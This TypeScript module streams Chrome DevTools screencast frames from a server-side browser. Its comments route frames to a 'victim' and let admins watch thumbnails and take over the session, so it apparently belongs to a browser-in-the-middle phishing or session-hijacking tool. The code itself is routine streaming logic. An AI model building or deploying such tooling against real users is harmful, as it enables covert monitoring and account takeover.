import type { CDPSession, Frame } from 'playwright';
import type { BrowserInstance } from './types.js';
import { recordFrame } from './metrics.js';

// ═══════════════════════════════════════════════════════════════════════════════
// Screencast Configuration Constants
// ═══════════════════════════════════════════════════════════════════════════════

/**
 * Maximum frame width in pixels.
 * Prevents excessive memory usage from ultra-wide displays.
 */
export const SCREENCAST_MAX_WIDTH = 3840;

/**
 * Maximum frame height in pixels.
 * Prevents excessive memory usage from ultra-tall displays.
 */
export const SCREENCAST_MAX_HEIGHT = 2160;

/**
 * JPEG compression quality (0-100).
 * Higher = better quality but larger frames and more bandwidth.
 * 90 provides excellent quality with reasonable file sizes.
 */
export const SCREENCAST_QUALITY = 90;

/**
 * Target frames per second for screencast.
 * Actual FPS may be lower depending on page complexity and system load.
 */
export const SCREENCAST_FPS = 30;

/**
 * Send thumbnail to admin every N frames.
 * Reduces admin bandwidth while still providing real-time preview.
 * Example: 5 means admins see 1 thumbnail for every 5 full frames.
 */
export const THUMBNAIL_EVERY_N_FRAMES = 5;

// ═══════════════════════════════════════════════════════════════════════════════
// Screencast Controller Interface
// ═══════════════════════════════════════════════════════════════════════════════

/**
 * Controller for managing an active screencast session.
 * Provides a stop() method to cleanly terminate the screencast.
 */
export interface ScreencastController {
  /** Stops the screencast and detaches the CDP session */
  stop: () => Promise<void>;
}

// ═══════════════════════════════════════════════════════════════════════════════
// Main Screencast Function
// ═══════════════════════════════════════════════════════════════════════════════

/**
 * Starts a Chrome DevTools Protocol (CDP) screencast for a browser instance.
 * 
 * **Critical Behavior:**
 * - Must call `Page.screencastFrameAck` for EVERY frame or Chromium stops
 *   sending frames after ~3 seconds (this is a CDP requirement)
 * - Does NOT await the `onFrame` callback — Socket.IO emit is synchronous
 * - Automatically restarts on main-frame navigation (CDP sessions detach on nav)
 * - Sends thumbnails to admin every THUMBNAIL_EVERY_N_FRAMES frames
 * 
 * **Frame Flow:**
 * 1. CDP emits 'Page.screencastFrame' event with base64 JPEG data
 * 2. We immediately send 'Page.screencastFrameAck' (required!)
 * 3. Convert base64 to Buffer
 * 4. Record frame for metrics
 * 5. Call instance.onFrame() to send to victim/admin
 * 6. Every Nth frame, call onThumbnail() to send to all admins
 * 
 * @param instance - Browser instance to capture frames from
 * @param onThumbnail - Callback for broadcasting thumbnails to admins
 * @returns Controller with stop() method for cleanup
 */
export async function startScreencast(
  instance: BrowserInstance,
  onThumbnail: (browserId: string, buf: Buffer) => void,
): Promise<ScreencastController> {
  let active = true;
  let frameCounter = 0;
  let currentSession: CDPSession | null = null;

  /**
   * Starts a new CDP screencast session.
   * Called initially and after each main-frame navigation.
   */
  async function startSession(): Promise<void> {
    if (!active) return;

    try {
      // Get fresh CDP session (navigation detaches old sessions)
      const session = await instance.page.context().newCDPSession(instance.page);
      currentSession = session;
      instance.cdpSession = session;

      /**
       * Handle incoming screencast frames.
       * 
       * CRITICAL: Must acknowledge EVERY frame immediately or Chromium
       * will stop sending frames after ~3 seconds. This is a CDP requirement.
       */
      session.on('Page.screencastFrame', (event: ScreencastFrameEvent) => {
        const { data, sessionId, metadata } = event;
        void metadata; // metadata has timestamp/deviceScaleFactor etc — unused for now

        // Acknowledge frame IMMEDIATELY — Chromium stops after ~3 frames without ack
        session.send('Page.screencastFrameAck', { sessionId }).catch(() => {
          // CDP session may have detached — ignore error
        });

        if (!active) return;

        // Convert base64 JPEG to Buffer
        const buf = Buffer.from(data, 'base64');

        // Record frame for FPS and latency metrics
        recordFrame(instance.id);

        /**
         * Dispatch frame via mutable callback.
         * This callback is swapped during admin takeover:
         * - Normal: sends to victim only
         * - Takeover: sends to both victim and admin
         */
        instance.onFrame(buf);

        // Send thumbnail to admin every Nth frame (reduces bandwidth)
        frameCounter++;
        if (frameCounter % THUMBNAIL_EVERY_N_FRAMES === 0) {
          onThumbnail(instance.id, buf);
        }
      });

      // Start the screencast with configured parameters
      await session.send('Page.startScreencast', {
        format: 'jpeg',
        quality: SCREENCAST_QUALITY,
        maxWidth: SCREENCAST_MAX_WIDTH,
        maxHeight: SCREENCAST_MAX_HEIGHT,
        everyNthFrame: 1, // capture every frame (we throttle thumbnails separately)
      });
    } catch (err) {
      // Context may have been destroyed; this is non-fatal
      console.error(`[screencast] Failed to start session: ${(err as Error).message}`);
    }
  }

  /**
   * Stops the current CDP screencast session.
   * Called before restarting on navigation or during cleanup.
   */
  async function stopCurrentSession(): Promise<void> {
    if (!currentSession) return;
    try {
      await currentSession.send('Page.stopScreencast');
    } catch {
      // Ignore — session may already be detached
    }
    try {
      // Detach automatically removes all CDP event listeners
      await currentSession.detach();
    } catch {
      // Ignore — session may already be detached
    }
    currentSession = null;
    instance.cdpSession = null;
  }

  /**
   * Handle navigation: restart screencast when main frame navigates.
   * 
   * CDP sessions are automatically detached on navigation, so we must
   * create a new session and restart the screencast.
   * 
   * We only restart for main frame navigation (not iframe navigation).
   */
  const frameNavigatedHandler = (frame: Frame) => {
    // Only restart for main frame (not iframes)
    if (frame.parentFrame() !== null) return;
    if (!active) return;

    // Stop old session and start new one
    void stopCurrentSession().then(() => {
      void startSession();
    });
  };
  
  instance.page.on('framenavigated', frameNavigatedHandler);

  // Start initial screencast
  await startSession();

  // Return controller for cleanup
  return {
    async stop() {
      active = false;
      // Remove framenavigated listener
      instance.page.off('framenavigated', frameNavigatedHandler);
      await stopCurrentSession();
    },
  };
}

// ═══════════════════════════════════════════════════════════════════════════════
// CDP Type Definitions
// ═══════════════════════════════════════════════════════════════════════════════

/**
 * CDP Page.screencastFrame event structure.
 * These types are not exported by Playwright's type definitions.
 */
interface ScreencastFrameEvent {
  /** Base64-encoded JPEG image data */
  data: string;
  
  /** Frame metadata (scroll position, scale factor, etc.) */
  metadata: {
    offsetTop: number;
    pageScaleFactor: number;
    deviceWidth: number;
    deviceHeight: number;
    scrollOffsetX: number;
    scrollOffsetY: number;
    timestamp?: number;
  };
  
  /** Session ID for acknowledgment (must be sent back via screencastFrameAck) */
  sessionId: number;
}